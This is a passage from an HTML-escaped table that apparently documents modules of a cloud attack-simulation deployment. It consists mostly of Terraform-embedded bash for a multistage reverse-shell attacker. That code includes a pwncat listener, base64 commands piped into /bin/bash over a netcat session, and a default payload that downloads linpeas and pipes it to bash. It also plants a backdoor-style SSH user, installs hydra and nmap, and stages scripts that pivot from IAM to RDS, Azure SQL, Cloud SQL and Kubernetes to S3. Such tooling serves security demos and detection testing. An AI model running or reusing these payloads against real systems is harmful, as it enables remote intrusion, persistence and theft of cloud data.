/tmp/netcat&amp;#46;log &amp;#124; grep &amp;#45;m 1 &quot;Connection received&quot;; do<br/>            log &quot;waiting for connection&amp;#46;&amp;#46;&amp;#46;&quot;;<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log &#x27;sending screen command: $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&#x27;;<br/>        screen &amp;#45;S netcat &amp;#45;p 0 &amp;#45;X stuff &quot;echo &#x27;$&amp;&amp;#35;123;local&amp;#46;base64&amp;&amp;#35;95;command&amp;&amp;#35;95;payload&amp;&amp;#35;125;&#x27; &amp;#124; base64 &amp;#45;d &amp;#124; /bin/bash &amp;#45;^M&quot;<br/>        log &quot;responder started&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        log &#x27;waiting 10 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 600<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &quot;&quot;<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-runbook-responder-reverse-shell-multistage      | ./modules/runbook/responder-reverse-shell-multistage | runbook_exec_reverse_shell_multistage_attacker   | context.azure.runbook.attacker.responder.reverse_shell_multistage | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;reverse_shell_multistage&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;iam2rds_role_name&quot;: &quot;rds_user_access_role_ciemdemo&quot;,<br/>                            &quot;iam2rds_session_name&quot;: &quot;attacker-session&quot;,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 4444,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;,<br/>                            &quot;reverse_shell_host&quot;: null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell-multistage | <pre>locals &amp;&amp;#35;123;<br/>    listen&amp;&amp;#35;95;port = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;<br/>    listen&amp;&amp;#35;95;ip = var&amp;#46;inputs&amp;&amp;#35;91;&quot;listen&amp;&amp;#35;95;ip&quot;&amp;&amp;#35;93;<br/>    attack&amp;&amp;#35;95;dir = &quot;/pwncat&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    PWNCAT&amp;&amp;#35;95;LOG=&quot;/tmp/pwncat&amp;#46;log&quot;<br/>    PWNCAT&amp;&amp;#35;95;SESSION=&quot;pwncat&quot;<br/>    PWNCAT&amp;&amp;#35;95;SESSION&amp;&amp;#35;95;LOCK=&quot;/tmp/pwncat&amp;&amp;#35;95;session&amp;#46;lock&quot;<br/>    if &amp;&amp;#35;91; &amp;#45;e &quot;$PWNCAT&amp;&amp;#35;95;SESSION&amp;&amp;#35;95;LOCK&quot; &amp;&amp;#35;93;  &amp;&amp; screen &amp;#45;ls &amp;#124; grep &amp;#45;q &quot;$PWNCAT&amp;&amp;#35;95;SESSION&quot;; then<br/>        log &quot;Pwncat session lock $PWNCAT&amp;&amp;#35;95;SESSION&amp;&amp;#35;95;LOCK exists and pwncat screen session running&amp;#46; Skipping setup&amp;#46;&quot;<br/>    else<br/>        rm &amp;#45;f &quot;$PWNCAT&amp;&amp;#35;95;SESSION&amp;&amp;#35;95;LOCK&quot;<br/>        log &quot;Session lock doesn&#x27;t exist and screen session not runing&amp;#46; Continuing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        log &quot;setting up reverse shell listener: $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;ip&amp;&amp;#35;125;:$&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;<br/>        screen &amp;#45;S $PWNCAT&amp;&amp;#35;95;SESSION &amp;#45;X quit<br/>        screen &amp;#45;wipe<br/>        log &quot;cleaning app directory&quot;<br/>        rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>        mkdir &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;/plugins $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;/resources<br/>        cd $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;listener&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; listener&amp;#46;py<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;responder&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; plugins/responder&amp;#46;py<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;instance2rds&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; resources/instance2rds&amp;#46;sh<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;iam2rds&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; resources/iam2rds&amp;#46;sh<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;azureiam2azuresql&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; resources/azureiam2azuresql&amp;#46;sh<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;gcpiam2cloudsql&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; resources/gcpiam2cloudsql&amp;#46;sh<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;scan2kubeshell&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; resources/scan2kubeshell&amp;#46;sh<br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;kube2s3&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; resources/kube2s3&amp;#46;sh <br/>        echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;iam2enum&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; resources/iam2enum&amp;#46;sh<br/>        log &quot;installing required python3&amp;#46;9&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        apt&amp;#45;get install &amp;#45;y python3&amp;#46;9 python3&amp;#46;9&amp;#45;venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        curl https://bootstrap&amp;#46;pypa&amp;#46;io/get&amp;#45;pip&amp;#46;py &amp;#45;o get&amp;#45;pip&amp;#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&amp;#46;9 get&amp;#45;pip&amp;#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        sleep 5<br/>        python3&amp;#46;9 &amp;#45;m pip install &amp;#45;U pip setuptools wheel setuptools&amp;&amp;#35;95;rust jinja2 jc &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&amp;#46;9 &amp;#45;m pip install &amp;#45;U pwncat&amp;#45;cs &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        sleep 5<br/>        if &amp;#33; &amp;&amp;#35;91; &amp;#45;e /home/socksuser/&amp;#46;ssh/socksuser&amp;&amp;#35;95;key &amp;&amp;#35;93;; then<br/>            log &quot;adding tunneled port scanning user &amp;#45; socksuser&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            adduser &amp;#45;&amp;#45;gecos &quot;&quot; &amp;#45;&amp;#45;disabled&amp;#45;password &quot;socksuser&quot; &amp;#124;&amp;#124; log &quot;socksuser user already exists&quot;<br/>            log &quot;adding ssh keys for socks user&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            mkdir &amp;#45;p /home/socksuser/&amp;#46;ssh 2&gt;&amp;1 &amp;#124; tee &amp;#45;a $LOGFILE<br/>            ssh&amp;#45;keygen &amp;#45;t rsa &amp;#45;N &#x27;&#x27; &amp;#45;b 4096 &amp;#45;f /home/socksuser/&amp;#46;ssh/socksuser&amp;&amp;#35;95;key 2&gt;&amp;1 &amp;#124; tee &amp;#45;a $LOGFILE<br/>            cat /home/socksuser/&amp;#46;ssh/socksuser&amp;&amp;#35;95;key&amp;#46;pub &gt;&gt; /home/socksuser/&amp;#46;ssh/authorized&amp;&amp;#35;95;keys 2&gt;&amp;1 &amp;#124; tee &amp;#45;a $LOGFILE<br/>            chown &amp;#45;R socksuser:socksuser /home/socksuser<br/>            chmod 600 /home/socksuser/&amp;#46;ssh/authorized&amp;&amp;#35;95;keys 2&gt;&amp;1 &amp;#124; tee &amp;#45;a $LOGFILE<br/>            log &quot;socksuser setup complete&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>        START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>        while true; do<br/>            for i in &amp;&amp;#35;96;seq $&amp;&amp;#35;40;&amp;&amp;#35;40;MAXLOG&amp;#45;1&amp;&amp;#35;41;&amp;&amp;#35;41; &amp;#45;1 1&amp;&amp;#35;96;; do mv &quot;$PWNCAT&amp;&amp;#35;95;LOG&amp;#46;&quot;&amp;&amp;#35;123;$i,$&amp;&amp;#35;40;&amp;&amp;#35;40;i&amp;#43;1&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125; 2&gt;/dev/null &amp;#124;&amp;#124; true; done<br/>            mv $PWNCAT&amp;&amp;#35;95;LOG &quot;$PWNCAT&amp;&amp;#35;95;LOG&amp;#46;1&quot; 2&gt;/dev/null &amp;#124;&amp;#124; true<br/>            log &quot;starting background process via screen&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            screen &amp;#45;S $PWNCAT&amp;&amp;#35;95;SESSION &amp;#45;X quit<br/>            screen &amp;#45;wipe<br/>            screen &amp;#45;d &amp;#45;L &amp;#45;Logfile $PWNCAT&amp;&amp;#35;95;LOG &amp;#45;S $PWNCAT&amp;&amp;#35;95;SESSION &amp;#45;m /bin/bash &amp;#45;c &quot;cd $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125; &amp;&amp; python3&amp;#46;9 listener&amp;#46;py &amp;#45;&amp;#45;port=&amp;&amp;#35;92;&quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;reverse&amp;&amp;#35;95;shell&amp;&amp;#35;95;port&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;&amp;#35;92;&quot; &amp;#45;&amp;#45;host=&amp;&amp;#35;92;&quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;reverse&amp;&amp;#35;95;shell&amp;&amp;#35;95;host&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;&amp;#35;92;&quot; &amp;#45;&amp;#45;payload=&amp;&amp;#35;92;&quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;payload&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;&amp;#35;92;&quot;&quot;<br/>            screen &amp;#45;S $PWNCAT&amp;&amp;#35;95;SESSION &amp;#45;X colon &quot;logfile flush 0^M&quot;<br/>            log &quot;Checking for listener&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            TIMEOUT=1800<br/>            START&amp;&amp;#35;95;TIME=$&amp;&amp;#35;40;date &amp;#43;%s&amp;&amp;#35;41;<br/>            while true; do<br/>                CURRENT&amp;&amp;#35;95;TIME=$&amp;&amp;#35;40;date &amp;#43;%s&amp;&amp;#35;41;<br/>                ELAPSED&amp;&amp;#35;95;TIME=$&amp;&amp;#35;40;&amp;&amp;#35;40;CURRENT&amp;&amp;#35;95;TIME &amp;#45; START&amp;&amp;#35;95;TIME&amp;&amp;#35;41;&amp;&amp;#35;41;<br/>                if grep &quot;listener created&quot; $PWNCAT&amp;&amp;#35;95;LOG; then<br/>                    log &quot;Found listener created log in $PWNCAT&amp;&amp;#35;95;LOG &amp;#45; checking for port response&quot;<br/>                    while &amp;#33; nc &amp;#45;z &amp;#45;w 5 &amp;#45;vv 127&amp;#46;0&amp;#46;0&amp;#46;1 $&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125; &gt; /dev/null; do<br/>                        log &quot;failed check &amp;#45; waiting for pwncat port response: 127&amp;#46;0&amp;#46;0&amp;#46;1:$&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;;<br/>                        sleep 30;<br/>                        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                            break 3<br/>                        fi<br/>                    done;<br/>                    log &quot;Sucessfully connected to 127&amp;#46;0&amp;#46;0&amp;#46;1:$&amp;&amp;#35;123;local&amp;#46;listen&amp;&amp;#35;95;port&amp;&amp;#35;125;&quot;<br/>                    break<br/>                fi<br/>                if &amp;&amp;#35;91; $ELAPSED&amp;&amp;#35;95;TIME &amp;#45;gt $TIMEOUT &amp;&amp;#35;93;; then<br/>                    log &quot;Failed to find listener created log for pwncat &amp;#45; timeout after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>            done<br/>            log &quot;responder started&amp;#46;&quot;<br/>            log &quot;starting sleep for 30 minutes &amp;#45; blocking new tasks while accepting connections&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            sleep 1800<br/>            log &quot;sleep complete &amp;#45; checking for running sessions&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            while &amp;&amp;#35;91; &amp;#45;e &quot;$PWNCAT&amp;&amp;#35;95;SESSION&amp;&amp;#35;95;LOCK&quot; &amp;&amp;#35;93;  &amp;&amp; screen &amp;#45;ls &amp;#124; grep &amp;#45;q &quot;$PWNCAT&amp;&amp;#35;95;SESSION&quot;; do<br/>                log &quot;pwncat session still running &amp;#45; waiting before restart&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sleep 600<br/>            done<br/>            log &quot;no pwncat sessions found &amp;#45; continuing&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            fi<br/>        done<br/>    fi<br/>    log &quot;done&amp;#46;&quot;<br/>    EOT<br/><br/>    listener        = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/listener&amp;#46;py&quot;&amp;&amp;#35;41;<br/>    responder       = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/responder&amp;#46;py&quot;&amp;&amp;#35;41;<br/>    instance2rds    = templatefile&amp;&amp;#35;40;<br/>                                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/instance2rds&amp;#46;sh&quot;, <br/>                                &amp;&amp;#35;123;<br/>                                    region = var&amp;#46;inputs&amp;&amp;#35;91;&quot;region&quot;&amp;&amp;#35;93;,<br/>                                    environment = var&amp;#46;inputs&amp;&amp;#35;91;&quot;environment&quot;&amp;&amp;#35;93;,<br/>                                    deployment = var&amp;#46;inputs&amp;&amp;#35;91;&quot;deployment&quot;&amp;&amp;#35;93;<br/>                                &amp;&amp;#35;125;<br/>                            &amp;&amp;#35;41;<br/><br/>    iam2rds         = templatefile&amp;&amp;#35;40;<br/>                                &quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/iam2rds&amp;#46;sh&quot;, <br/>                                &amp;&amp;#35;123;<br/>                                    region = var&amp;#46;inputs&amp;&amp;#35;91;&quot;region&quot;&amp;&amp;#35;93;,<br/>                                    environment = var&amp;#46;inputs&amp;&amp;#35;91;&quot;environment&quot;&amp;&amp;#35;93;,<br/>                                    deployment = var&amp;#46;inputs&amp;&amp;#35;91;&quot;deployment&quot;&amp;&amp;#35;93;,<br/>                                    iam2rds&amp;&amp;#35;95;role&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;iam2rds&amp;&amp;#35;95;role&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;<br/>                                    iam2rds&amp;&amp;#35;95;session&amp;&amp;#35;95;name = &quot;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;iam2rds&amp;&amp;#35;95;session&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&amp;#45;$&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;deployment&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>                                &amp;&amp;#35;125;<br/>                            &amp;&amp;#35;41;<br/>    <br/>    iam2enum = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/iam2enum&amp;#46;sh&quot;&amp;&amp;#35;41;<br/>                            <br/>    azureiam2azuresql = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/azureiam2azuresql&amp;#46;sh&quot;&amp;&amp;#35;41;                            <br/><br/>    gcpiam2cloudsql = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/gcpiam2cloudsql&amp;#46;sh&quot;&amp;&amp;#35;41;<br/><br/>    scan2kubeshell = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/scan2kubeshell&amp;#46;sh&quot;&amp;&amp;#35;41;<br/>    <br/>    kube2s3 = file&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/resources/kube2s3&amp;#46;sh&quot;&amp;&amp;#35;41;<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        apt&amp;&amp;#35;95;packages = &quot;proxychains4 nmap hydra python3&amp;#45;pip&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if &amp;#33; command &amp;#45;v proxychains4 &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; command &amp;#45;v hydra &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; command &amp;#45;v hydra &gt; /dev/null; then<br/>            yum update &amp;#45;y<br/>            yum install &amp;#45;y git<br/>            yum groupinstall &amp;#45;y &#x27;Development Tools&#x27;<br/>            &amp;#35; proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github&amp;#46;com/rofl0r/proxychains&amp;#45;ng<br/>            cd proxychains&amp;#45;ng<br/>            &amp;#46;/configure &amp;&amp; make &amp;&amp; make install<br/>            make install&amp;#45;config<br/>            &amp;#35; hydra<br/>            cd /usr/local/src<br/>            git clone https://github&amp;#46;com/vanhauser&amp;#45;thc/thc&amp;#45;hydra<br/>            cd thc&amp;#45;hydra<br/>            &amp;#46;/configure &amp;&amp; make &amp;&amp; make install<br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;nmap python3&amp;#45;pip&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;instance2rds&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;instance2rds&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;,<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;iam2rds&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;iam2rds&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;,<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;scan2kubeshell&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;scan2kubeshell&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;,<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;kube2s3&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;kube2s3&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;,<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;gcpiam2cloudsql&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;gcpiam2cloudsql&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;,<br/>            &amp;&amp;#35;123;<br/>                name = &quot;$&amp;&amp;#35;123;basename&amp;&amp;#35;40;abspath&amp;&amp;#35;40;path&amp;#46;module&amp;&amp;#35;41;&amp;&amp;#35;41;&amp;&amp;#35;125;&amp;&amp;#35;95;iam2enum&amp;#46;sh&quot;<br/>                content = base64encode&amp;&amp;#35;40;local&amp;#46;iam2enum&amp;&amp;#35;41;<br/>            &amp;&amp;#35;125;<br/>        &amp;&amp;#35;93;<br/>    